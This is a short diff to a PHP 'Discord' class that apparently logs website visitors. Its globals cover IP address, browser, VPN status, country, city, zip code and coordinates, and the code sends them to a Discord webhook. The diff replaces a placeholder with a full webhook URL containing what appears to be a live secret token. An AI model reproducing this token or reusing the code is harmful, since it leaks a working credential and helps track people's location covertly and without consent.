@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1054478654945636453/MnxVSa0_3zoOBC8Xo0dq_Ov3xhTusb-BOv6XNl-ks5YWSqVRK7B5l_AFyt8CbS5UKuJz";
 
         $InfoArr = array(
             "username" => "$WebhookName",
